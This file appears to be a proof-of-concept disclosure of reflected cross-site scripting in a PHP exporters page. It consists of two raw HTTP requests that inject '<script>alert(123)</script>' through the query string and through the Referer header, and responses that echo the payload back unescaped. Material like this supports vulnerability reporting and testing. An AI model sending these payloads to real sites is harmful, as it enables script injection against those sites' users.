@@ -1,0 +1,30 @@
+#Request 1
+GET /d4d/exporters.php?a<script>alert(123)</script>=1 HTTP/1.1
+Host: A.B.C.D
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:12.0) Gecko/20100101 Firefox/12.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+
+#Response 1
+<snip>
+<a href="/d4d/exporters.php?a<script>alert(1)</script>=1">/d4d/exporters.php?a<script>alert(123)</script>=1</a></td></tr>
+<snip>
+
+#Request 2
+GET /d4d/exporters.php HTTP/1.1
+Host: A.B.C.D
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)
+Connection: close
+Referer: http://D.E.F.G/search?hl=en&q=a<script>alert(123)</script>=1
+Content-Length: 2
+
+#Response 2
+<snip>
+<a href="http://D.E.F.G/search?hl=en&q=a<script>alert(123)</script>=1">http://D.E.F.G/search?hl=en&q=a<script>alert(123)</script>=1</a>
+<snip>
+
+
